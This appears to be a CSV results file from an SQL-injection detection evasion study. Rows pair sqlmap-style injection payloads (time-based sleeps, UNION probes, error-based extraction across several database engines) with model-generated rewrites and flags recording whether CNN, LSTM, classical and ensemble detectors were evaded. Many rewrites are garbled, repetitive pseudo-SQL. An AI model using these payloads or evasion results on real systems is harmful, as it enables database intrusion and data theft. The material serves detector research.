original_query,generated_query,validity,is_sqli,cnn_evaded_detection,lstm_evaded_detection,classical_evaded_detection,ensemble_avg_evaded_detection,ensemble_strict_evaded_detection
"1""   )    )    and elt  (  4249  =  4249,7259  )   and    (    (   ""abcm"" like ""abcm","SELECT DISTINCT elt ( 4249 = 4249 = 4249 = 4249,7259) AND ((((((((((enforcement) FROM SQL injection detection) FROM elt) AND NOT abcm = 4249 = 4249 = 4249 = 4249 = 4249 = 7259) AND ((((enforcement = 'abcm')",1,1,0,0,0,0,0
1'  )   or sleep  (  5  )   and   (  'kgbm'  =  'kgbm,SELECT MIN(sql injection) FROM SQL injection detection,1,0,1,1,1,1,1
"1'||  (  select 'eils' where 8308  =  8308 or 8514  =  benchmark  (  5000000,md5  (  0x544d5a4c   )    )   #",SELECT 'eils' FROM SQL injection',1,0,1,1,1,1,1
"1 or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null  )  -- xsob",SELECT NOT (SELECT SUM(invalid) FROM SQL_inject) FROM query: 1 OR query: 69 -|char ( 85 ) FROM query: 0,1,1,0,0,1,0,0
1  )   where 2307  =  2307,SELECT COUNT(*) FROM query: 1 JOIN SQL injection query: Query: 1 JOIN 2307 = 2307,0,0,1,0,1,1,0
"1""  )   as ifgl where 2190  =  2190 rlike   (  select   (  case when   (  7689  =  7689  )   then 1 else 0x28 end   )    )   --","SELECT MIN(1 AS _x28_end) FROM SQL injection_diagnosis WHERE NOT ifgl_place = ""2190 = 2190 rlike (SELECT MIN(7689 = 7689)"" AND NOT ifgl = ""1 else 0x28 end )""",1,1,0,0,0,0,0
-8999'   )    )     )   or 6872  =  6872 and    (    (     (  'jare'  =  'jare,SELECT MIN(sql injection) FROM SQL injection detection,1,0,1,1,1,1,1
"-1254"" or 4144  =    (  select upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4144  =  4144  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   from dual  )  ",SELECT MIN(sql injection) FROM SQL SELECT MIN(sql injection) FROM SQL -1254 OR 4144 = 4144 = (SELECT SUM(SELECT SUM(SUM(SUM(SUM(SUM)) FROM SQL),1,1,0,0,1,0,0
"1' in boolean mode  )   and elt  (  9630  =  4765,4765  )  #","SELECT MIN(995 = 4765,4765 ) FROM SQL injection detection",1,1,0,1,1,1,0
"1%"" rlike   (  select   (  case when   (  7689  =  7689  )   then 1 else 0x28 end   )    )    and ""%""  =  """,SELECT MIN(sql injection) FROM SQL injection detection,1,0,1,1,1,1,1
"1'  )   union all select null,null,null--","SELECT null,null,null-- FROM SQL SELECT MIN(sql injection detection) FROM SQL SELECT MIN(null,null--) FROM SQL SELECT MIN(null) FROM SQL SELECT MIN(null) FROM SQL SELECT MIN(null) FROM query: 1'",1,1,1,0,1,1,0
"1' in boolean mode  )   or   (  select 9173 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9173  =  9173,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )  #","SELECT * FROM SQL_Injections WHERE NOT 0x7171706a71 = 'excess injection' ORDER BY 0x7171706a71, (SELECT MIN(SELECT MIN(SELECT MIN(SELECT MIN(SELECT MIN(SELECT MIN(SELECT MIN(SELECT MIN(SELECT MIN(SELECT MIN(SELECT MIN(SELECT MIN(SELECT MIN(SELECT) FROM (SELECT SUM(SQL_SET 1) FROM SQL_Injection)",0,1,1,0,1,1,0
"-1988 where 4597  =  4597 union all select 4597,4597,4597,4597,4597,4597--",SELECT MIN(4597 = 4597) FROM SQL injection detection,1,0,1,0,1,1,0
"-4923"" or 3440  =  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  select   (  case when   (  3440  =  3440  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric  )   and ""afjc"" like ""afjc",SELECT MIN(sql injection) FROM SQL -4923 ORDER BY chr( 113 ),1,1,1,1,0,1,0
"1'  )   and make_set  (  6488  =  5525,5525  )  ","SELECT MIN(6488 = 5525,5525) FROM SQL injection detection",1,0,1,0,1,1,0
1' in boolean mode  )   union all select null#,SELECT MIN(sql injection) FROM SQL injection detection,1,0,1,1,1,1,1
"call regexp_substring  (  repeat  (  right  (  char  (  3702  )  ,0  )  ,500000000  )  ,null  )   and ""rugr""  =  ""rugr",SELECT MIN(sql ) FROM SQL injection detection,1,0,1,1,1,1,1
1'  )   where 8086  =  8086 and 1430  =  7941--,SELECT MIN(sql injection) FROM SQL SELECT MIN(8086 = 8086) FROM SQL SELECT MIN(7941 - 7941 - 7941 - rewritten) FROM SQL SELECT MIN(8086 = 8086) FROM SQL SELECT MIN(8086 = 8086) FROM Query: 1',1,1,0,0,1,0,0
"1""  )   as xaye where 5343  =  5343 and 4355  =  7475#","SELECT MIN(sql injection) FROM SQL SELECT MIN(sql injection) FROM SELECT MIN(sql injection) FROM Query: 1"" AS _xaye FROM SQL SELECT MIN(sql injection) FROM SELECT MIN(sql injection) FROM SELECT MIN(sql injection) FROM Query: 1""",1,1,1,0,1,1,0
"1""  )   or 8156  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --","SELECT MIN(*) FROM SQL injection detection WHERE NOT SELECT MIN(1,5000000) FROM generate_series",1,1,0,0,1,0,0
"1'||  (  select 'bccx' where 5881  =  5881 and elt  (  1210  =  1210,sleep  (  5   )    )     )  ||'","SELECT DISTINCT'sql injection' FROM SQL SELECT SELECT DISTINCT 'elt ( 1210 = 1210,sleep ( 5 ) ) FROM SQL injection'",1,1,0,0,0,0,0
"-8487'  )   where 9655  =  9655 union all select 9655,9655,9655,9655,9655,9655,9655,9655,9655,9655--",SELECT MIN(sql injection) FROM SQL SELECT MIN(sql injection) FROM SELECT MIN(sql injection) FROM SELECT MIN(sql injection) FROM SELECT MIN(sql injection) FROM SELECT MIN(sql injection) FROM SELECT SELECT MIN(sql injection) FROM SELECT MIN(sql injection) FROM SELECT MIN(sql injection) FROM SELECT MIN(sql injection) FROM SELECT SELECT MIN(sql injection) FROM SELECT SELECT MIN(sql injection) FROM SELECT SELECT MIN(sql injection) FROM SELECT SELECT MIN(sql injection) FROM SELECT SELECT MIN(sql injection) FROM SELECT SELECT MIN(sql injection) FROM SELECT SELECT MIN(sql injection) FROM SELECT SELECT MIN(sql injection) FROM SELECT SELECT MIN(sql,1,1,1,1,1,1,1
-4389'   )    )     )   or   (  1139  =  3499  )  *3499 and    (    (     (  'qoch'  =  'qoch,SELECT DISTINCT'sql injection' FROM SQL SELECT MIN(1139 = 3499) *3499 AND ((((((qoch) = 'qoch'),1,1,0,0,0,0,0
"-4033'   )    )    or 1570  =  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  1570  =  1570  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and    (    (   'ouup'  =  'ouup",SELECT MIN(sql injection) FROM SQL injection detection) ORDER BY MIN(sql injection),1,0,1,1,1,1,1
1' where 6406  =  6406,SELECT MIN(6406 = 6406) FROM SQL injection detection,1,0,0,0,1,0,0
"1'  )   where 5799  =  5799 union all select null,null,null,null,null--",SELECT MIN(sql injection) FROM SQL - SELECT MIN(sql injection) FROM SQL - 5799 = 5799,1,1,1,1,1,1,1
"1""   )    )    or 8466  =  benchmark  (  5000000,md5  (  0x694a4745   )    )    and    (    (   ""zlwb""  =  ""zlwb","SELECT MIN(5000000,md5 ( 0x694a4745 ) FROM SQL injection detection) FROM SQL SELECT MIN(5000000,md5 ( 0x694a4745 ) FROM 8466 = 8466 = benchmark (5000000,md5 ( 0x694a4745 ) AND ( ( ( ( ( ( ( ( ( ( (SELECT zlwb) FROM SQL injection))",1,1,0,0,0,0,0
"1""   )    )     )   and 4386  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4386  =  4386  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    and    (    (     (  ""djrh""  =  ""djrh","SELECT MIN(sql injection) FROM SQL_inaddr.get_host_address) AND 4386 = ""utl_inaddr.inaddr.inaddr.inaddr.inaddr.inaddr.inaddr.inaddr.inaddr.inaddr.inaddr.inaddr.inaddr.inaddr.inaddr.inaddr.inaddr.inaddr.inaddr.inaddr (113 ) ||chr ( 4386 = 4386)",1,1,0,0,1,0,0
-2129'  )   or 2724 in    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  2724  =  2724  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and   (  'eutm' like 'eutm,SELECT MIN(sql injection) FROM SQL injection detection) ORDER BY MIN(sql injection),1,0,1,1,1,1,1
"1'   )    )     )   or 4411  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )   and    (    (     (  'ogwd' like 'ogwd","SELECT COUNT(*) FROM SQL_injection WHERE NOT sysusers as sys1,sysusers as sysusers as sys4,sysusers as sys7 INTERSECT SELECT DISTINCT ( (SELECT MIN(*) FROM SQL) FROM SELECT MIN(*) FROM SELECT SELECT MIN(*) FROM SELECT SELECT MIN(*) FROM SQL SELECT SELECT * FROM SELECT SUM((SELECT SUM((SELECT SUM((SELECT SUM(sysusers as sys1,sysusers as sysusers as sysusers as sys4,sysusers as sys7) FROM SELECT SELECT SELECT MIN(*) FROM SQL Injection) FROM SELECT MIN(SELECT MIN(*) FROM SELECT MIN(SELECT MIN(*) FROM SQL) FROM SELECT MIN(SELECT",1,1,0,0,1,0,0
"-2784'   )    )    union all select 6775,6775,6775,6775,6775,6775,6775,6775,6775#","SELECT MIN(SQL injection) FROM SQL_Injection WHERE NOT SELECT 6775,6775,6775,6775,6775,6775,6775,6775,6775# = ""SQL injection detection""",1,1,1,0,0,0,0
"-8094  )   or elt  (  1032  =  1032,3623  )   and   (  4569  =  4569","SELECT * FROM SQL AS _8094, 'elt', MIN(4569 = 4569) FROM SELECT * FROM elt WHERE NOT SELECT MIN(4569 = 4569) FROM SQL_Injector ='sq injection'",1,1,1,0,1,1,0
"-2909'||  (  select 'qfeq' where 7062  =  7062 union all select 7062,7062,7062,7062,7062,7062--",SELECT'sqfeq' FROM SQL -2909'|| WHERE 7062 = 7062 = 7062,0,1,0,0,0,0,0
-3520%' or 8571  =  8571--,"SELECT MIN(sql injection) FROM SQL SELECT -520%', 8571 = 8571--",1,1,0,0,0,0,0
"1"" where 1618  =  1618 or 8156  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --","SELECT MIN(*) FROM SQL injection detection WHERE 1618 = 1618 OR 16156 = (SELECT MIN(1,5000000) FROM generate_series)",1,1,0,0,0,0,0
1'  )   where 7478  =  7478,SELECT MIN(sql injection) FROM SQL SELECT MIN(sql injection) FROM Query: 1' JOIN 7478 = 7478,1,1,0,0,1,0,0
-8080'   )    )    order by 1#,SELECT MIN(sql injection) FROM SQL injection detection ORDER BY MIN(sql injection),1,0,1,1,1,1,1
"-2798'+  (  select 'emui' where 9565  =  9565 union all select 9565,9565,9565,9565--",SELECT MIN(sequence) FROM SQL injection detection,1,0,1,1,1,1,1
"-1543%' union all select 9341,9341,9341,9341,9341,9341,9341,9341,9341--","SELECT 9341,9341,9341,9341-- FROM SQL SELECT MIN(sql injection) FROM SELECT MIN(sql injection) FROM SELECT MIN(sql injection) FROM SELECT MIN(sql injection) FROM SELECT MIN(sql injection) FROM SELECT MIN(sql injection) FROM SELECT MIN(sql injection) FROM SELECT MIN(sql injection) FROM SELECT 9341,9341,9341,9341,9341,9341,9341,9341, SELECT MIN(sql injection) FROM SELECT SELECT MIN(sql injection) FROM SELECT MIN(sql injection) FROM SELECT SELECT MIN(sql injection) FROM SELECT SELECT MIN(sql injection) FROM SELECT SELECT MIN(sql injection) FROM SELECT SELECT MIN(sql injection) FROM SELECT SELECT MIN(sql injection)",1,1,1,0,1,1,0
1  )   or 6793  =    (  select 6793 from pg_sleep  (  5   )    ) ,"SELECT 6793 FROM pg_sleep WHERE NOT 6793 = ""sql injection detection""",1,0,1,1,1,1,1
"1'   )    )    and   (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  3484  =  3484,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )   and    (    (   'bgdp'  =  'bgdp","SELECT MIN(s) FROM SQL injection_diagnoses) FROM SQL - SELECT 0x71706a71, 'bgdp' FROM SQL SELECT MIN(s) FROM SQL SELECT MIN(s) FROM SQL SELECT 0x71706a71, 'bgdp' FROM SELECT MIN(s) FROM SQL SELECT MIN(s) FROM SELECT MIN(s) FROM SQL SELECT, COUNT(*) FROM (SELECT MIN(s) FROM SELECT SUM((SELECT, COUNT(s) FROM SELECT, SUM((s) FROM SQL SELECT, 'bgdp' FROM SELECT, SUM((s) FROM SQL SELECT, 'bgdp' FROM SELECT SELECT,'sql injection','sql injection','sql injection')",1,1,0,0,1,0,0
1'||  (  select 'svnn' from dual where 8710  =  8710,SELECT DISTINCT svnn FROM SQL injection detection WHERE NOT svnn = 8710,1,0,1,1,1,1,1
end and   (  'jzlr'  =  'jzlr,SELECT MIN(sql injection) FROM SQL injection detection,1,0,1,1,1,1,1
"-4558"" or   (  3965  =  3933  )  *3933 and ""hmdb"" like ""hmdb","SELECT MIN(3965 = 3933 - 3933 AND hmdb = ""hmdb"" AND NOT SQL injection detection.sql injection detection.sql injection detection.sql injection detection.sql injection_detecting.sql injection_detecting.sql -4558"" ORDER BY hmdb",1,1,0,0,0,0,0
"1',  (  select   (  case when   (  3888  =  3888  )   then   (  select count  (  *  )   from generate_series  (  1,5000000   )    )    else 1/  (  select 0  )   end   )    )   ",SELECT MIN(sequence) FROM SQL injection detection,1,0,1,1,1,1,1
1'  )   as dpmh where 5281  =  5281 and 2006  =  2006,SELECT dpmh FROM SQL injection detection WHERE 5281 = 5281 AND 2006 = 2006,1,0,0,1,0,0,0
1'  )   where 3767  =  3767 and 6240  =    (  'qqpjq'||  (  select case 6240 when 6240 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )  --,SELECT MIN(sqpjq) FROM SQL injection_detection WHERE 3767 = 3767 AND 6240 = (SELECT SUM(qqpjq)|| (SELECT SUM(qzvzq) FROM SQL SELECT SUM(sqpjq) FROM rdb$database ) ||'qzvzq'),1,1,0,0,0,0,0
"1""   )    )    as nbdc where 4444  =  4444 union all select null,null--","SELECT MIN(sql injection) FROM SQL - 4444 = 4444 union All select null,null-- Delete the generated FROM SQL SELECT MIN(sql injection) FROM SQL SELECT MIN(sql injection) FROM SQL SELECT MIN(sql injection) FROM SELECT MIN(sql injection) FROM SELECT MIN(sql injection) FROM SELECT MIN(sql injection) FROM SELECT MIN(SQL-1) FROM SQL SELECT SELECT MIN(44 = 4444 = 4444",1,1,0,0,1,0,0
"select * from generate_series  (  2673,2673,case when   (  2673  =  1468  )   then 1 else 0 end  )   limit 1--",SELECT * FROM * FROM generate_series WHERE NOT SQL_injection = 'valid' AND NOT SELECT MIN(2673 = 1468 ) FROM create_series,1,1,0,1,1,1,0
"1'  )   and 3824  =  benchmark  (  5000000,md5  (  0x76555642   )    )    and   (  'seyd'  =  'seyd","SELECT MIN(5000000,md5 ( 0x76555642 ) FROM SQL injection detection) AND NOT'seyd ='sq injection'",1,1,0,0,1,0,0
"1 where 1186  =  1186 union all select null,null,null,null,null,null,null#","SELECT MIN(sql injection) FROM SQL JOIN null,null,null,null,null,null,null,null# FROM SQL JOIN detection of SQL_Injections'",0,0,1,1,0,1,0
"-1816""  )   or 1570  =  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  1570  =  1570  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and   (  ""dztr"" like ""dztr",SELECT DISTINCT dztr FROM SQL injection detection,1,0,1,1,1,1,1
"-5425 where 5933  =  5933 union all select 5933,5933,5933--","SELECT MIN(sql injection) FROM SQL -5425 WHERE 5933 = 5933 = 5933 AND union = 5933,5933-- for = 5933",1,1,0,0,0,0,0
1'+  (  select 'jkgf' where 7487  =  7487,SELECT DISTINCT jkgf FROM SQL SELECT 7487 = 7487,1,0,1,1,1,1,1
select   (  case when   (  1082  =  6755  )   then 1082 else 1082*  (  select 1082 from mysql.db  )   end  )  #,SELECT 1082 FROM SQL AS _number WHERE NOT SELECT MIN(sql.db ) FROM query: SELECT MIN(sql.db ) FROM query:SELECT MIN(sql.db ) FROM query:SELECT MIN(sql.db ) FROM query:SELECT MIN(sql.db ) FROM query:SELECT MIN(sql.db ) FROM query:SELECT 1082 FROM mysql.db ) FROM SELECT SUM(1002) FROM SELECT MIN(sql injection) FROM SELECT SELECT MIN(sql_db ) FROM SELECT MIN(sql_db ) FROM query: query: query: query: 'yes',1,0,0,1,1,1,0
"1%"" union all select null,null,null,null,null,null,null,null,null,null#",SELECT MIN(sql injection) FROM SQL SELECT detection FROM SQL SELECT SUM(null) FROM detection,1,0,1,1,1,1,1
"-7656""   )    )     )   union all select 3172,3172,3172,3172,3172,3172,3172,3172,3172,3172--","SELECT MIN(sql injection) FROM SQL_Injection WHERE NOT SELECT DISTINCT - 7656""",0,0,1,1,1,1,1
"1"" where 1809  =  1809 and make_set  (  8403  =  8403,8899  )  --","SELECT MIN(sql injection) FROM SQL injection detection WHERE 1809 = 1809 AND make_set (8403 = 8403,8899)",1,1,0,0,0,0,0
"1   )    )    as qzmg where 4344  =  4344 procedure analyse  (  extractvalue  (  9255,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x52515a50   )    )      )    )     )  ,1  )  --","SELECT * FROM SQL, SELECT * FROM qzmg WHERE NOT qzmg = 4344 = 4344 ORDER BY * DESC",1,1,1,1,1,1,1
"-5062""   )    )     )   union all select 4125,4125--","SELECT DISTINCT SUM(SQL injection) FROM SQL - SELECT DISTINCT 4125,4125-- FROM query: -5062""",1,1,1,1,0,1,0
1   )    )    as xroy where 3274  =  3274,SELECT as _roy_name FROM xroy WHERE NOT SQL_injection = 3274 ORDER BY COUNT(*) DESC,1,0,1,1,1,1,1
"1'  )   union all select null,null,null,null,null,null,null,null--","SELECT null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null, null, null, null, null, null, null, null, null-- sulf injection detection,'sq' FROM SQL SELECT MIN(sql,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null-- sull FROM SQL injection detection, Query: 1' SEL",1,1,1,0,0,0,0
"1""   )    )     )   and 6240  =    (  'qqpjq'||  (  select case 6240 when 6240 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )   and    (    (     (  ""buwe""  =  ""buwe","SELECT DISTINCT t1.buwe FROM SQL injection AS t1 JOIN (SELECT SUM(success injection) FROM SQL injection) AS t2 ON t1.success = t2.qqpjq'|| (SELECT t1.buwe) FROM rdb$database )||'qqpjq') AND t1.succes ='sqpjq' AND t1.buwe = ""sqpjq') AS t2 WHERE t1.success = ""sqpjq')",0,1,0,0,0,0,0
"1"" and   (  select * from   (  select  (  sleep  (  5   )    )     )  fzno  )   and ""ssfu""  =  ""ssfu",SELECT DISTINCT ssfu FROM SQL injection detection,1,0,1,1,1,1,1
1%'   )    )     )   rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  sgvo  )   and    (    (     (  '%'  =  ',SELECT DISTINCT'sql injection' FROM SQL SELECT DISTINCT'sql injection' FROM SQL SELECT DISTINCT ( ( (SELECT MIN((%) FROM )),1,1,0,0,0,0,0
"iif  (  5519  =  4796,1,1/0  )  ","SELECT * FROM query: iif WHERE NOT SQL_injection = ""valid""",1,0,1,1,1,1,1
"1""   )    )    as vhrq where 1690  =  1690 and elt  (  1210  =  1210,sleep  (  5   )    )   --","SELECT MIN(sleep ( 5 ) FROM SQL injection detection) FROM SQL WHERE 1690 = 1690 AND elt ( 1210 = 1210 = 1210,sleep ( 5 )",1,1,0,0,0,0,0
"call regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  --","SELECT NOT crypt_key, COUNT(*) FROM query_substring WHERE NOT SQL_injection = ""valid""",1,0,1,0,1,1,0
"1%""   )    )    or 2367  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --","SELECT * FROM SQL_injection WHERE NOT rdb$types = 't2,rdb$collations as t3,rdb$functions as t4"" ORDER BY COUNT(*) DESC LIMIT 1",0,1,0,0,0,0,0
select   (  case when   (  1726  =  4080  )   then 1726 else 1/  (  select 0  )   end  )  --,SELECT MIN(SELECT 0 FROM SQL injection detection),1,0,1,1,1,1,1
"1""  )   where 7548  =  7548",SELECT MIN(7548 = 7548) FROM SQL injection detection,1,1,1,1,1,1,1
1'+  (  select sijr where 7250  =  7250,SELECT DISTINCT syjr FROM SQL injection detection WHERE 7250 = 7250,1,0,1,1,1,1,1
"-1162""   )    )    as mhmh where 8710  =  8710 or make_set  (  4822  =  7598,7598  )  --","SELECT MIN(SQL) FROM SQL Injection WHERE 8710 = 8710 OR make_set = 4822 = 7598,7598",1,1,0,0,0,0,0
"1   )    )     )   union all select null,null,null--","SELECT null,null,null-- FROM SQL SELECT MIN(sql injection) FROM SQL SELECT MIN(sql injection) FROM SQL",1,1,1,1,1,1,1
"1'   )    )    as cbka where 3176  =  3176 and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --","SELECT DISTINCT COUNT(*) FROM SQL_injection) AS _cbka FROM SELECT t1.sql_injection_detection FROM cbka WHERE 3176 = 3176 AND 8407 = (SELECT MIN(1,5000000) FROM generate_series)",1,1,0,0,1,0,0
"1""   )    )    and 6510  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )   and    (    (   ""ksrh""  =  ""ksrh","SELECT * FROM SQL_injection, COUNT(*) FROM SELECT * FROM sysusers WHERE NOT sysusers = ""sys1,sysusers as sys4,sysusers as sys7 INTERSECT SELECT * FROM SQL INNER JOIN (SELECT * FROM SELECT * FROM SELECT * FROM SELECT * FROM SELECT * FROM SELECT * FROM SELECT SELECT SUM(CSV_INSCTIONTION_0, 'SQL', SUM(CASE WHEN SUM(CASE WHERE sysusers as sys1,sysusers as sysusers as sys4,sysusers as sys7 ) AND (SELECT * FROM SELECT * FROM SELECT * FROM SELECT * FROM SELECT * FROM SELECT * FROM SELECT SELECT SUM(CSV) FROM SELECT SELECT SUM(CSV) FROM SELECT SUM",0,1,0,1,1,1,0
"1""   )    )     )   and   (  select * from   (  select  (  sleep  (  5   )    )     )  gcrr  )  #",SELECT MIN(sql ing_syst_required) FROM SQL injection detection,1,0,1,1,1,1,1
"-8661"" union all select 5731,5731--","SELECT 5731,5731-- FROM SQL injection AS _eluded FROM SQL_Injections WHERE NOT 5731 -8661"" union = ""Query: -8661""",1,1,0,1,0,0,0
"1'   )    )    and make_set  (  3793  =  8118,8118  )   and    (    (   'swvc' like 'swvc",SELECT DISTINCT'swvc' FROM SQL injection',1,0,1,1,1,1,1
"-3226'||  (  select 'ykdw' where 2617  =  2617 union all select 2617,2617--",SELECT MIN(sql injection) FROM SQL injection detection,1,0,1,1,1,1,1
"-5513""   )    )     )   or 3440  =  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  select   (  case when   (  3440  =  3440  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric  )   and    (    (     (  ""ovmk"" like ""ovmk",SELECT DISTINCT (((SELECT SUM(SQL) FROM SQL)) FROM SQL SELECT SUM(insert) FROM cast (SELECT SUM(insert) FROM cast) ORDER BY SUM(insert),1,1,0,0,1,0,0
waitfor delay '0:0:5' and    (    (   '%'  =  ',SELECT MIN(%) = '%' FROM SQL injection',1,0,0,0,0,0,0
"1""  )   and make_set  (  8403  =  8403,8899  )   and   (  ""dhss""  =  ""dhss","SELECT DISTINCT 8403 = 8403,8899 // FROM SQL_Injections WHERE NOT 8403 = 8403,8899 /////dhss = ""dhss"" AND NOT 8403 = 8403 AND query: 1"" ='sq injection'",1,1,0,0,0,0,0
-3880  )   or 4144  =    (  select upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4144  =  4144  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   from dual  )   and   (  5194  =  5194,SELECT MIN(SQL) FROM SQL injection detection) FROM SQL -3880 ORDER BY MIN(SQL),1,0,1,1,1,1,1
1'+  (  select 'qxmo' where 9511  =  9511 rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  vwyq  )  #,SELECT MIN(sql injection) FROM SQL - SELECT MIN(sql injection) FROM SQL - SELECT MIN(sql injection) FROM SQL - SELECT MIN(sql injection) FROM SELECT MIN(sql injection) FROM SELECT MIN(sql injection) FROM SQL - SUM(sql) FROM vwyq),1,1,1,0,1,1,0
"1'  )   and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and   (  'cuat'  =  'cuat",SELECT MIN(selection) FROM SQL injection detection) AND NOT  (SELECT MIN(selection) FROM SQL injection detection),1,1,1,1,1,1,1
"  (  select * from   (  select  (  sleep  (  5   )    )     )  srmq  )   and ""plqe""  =  ""plqe",SELECT * FROM (SELECT * FROM (SELECT * FROM (SELECT * FROM (SELECT * FROM (SELECT * FROM (SELECT * FROM (SELECT * FROM (SELECT * FROM (SELECT * FROM (SELECT * FROM (SELECT * FROM (SELECT * FROM (SELECT * FROM (SELECT * FROM (SELECT * FROM (SELECT * FROM (SELECT * FROM (SELECT * FROM (SELECT * FROM (SELECT * FROM (SELECT * FROM (SELECT SUM(srmq ) FROM SELECT SUM((SELECT * FROM SELECT * FROM SELECT * FROM SELECT * FROM SELECT * FROM SELECT * FROM (SELECT * FROM (SELECT * FROM (SELECT * FROM SELECT * FROM (SELECT * FROM (SELECT * FROM (SELECT * FROM SELECT * FROM (SELECT * FROM SELECT * FROM (SELECT * FROM (SELECT * FROM SELECT * FROM (SELECT * FROM SELECT * FROM (SELECT * FROM (SELECT SUM(SELECT * FROM (SELECT * FROM SEL,1,0,0,1,1,1,0
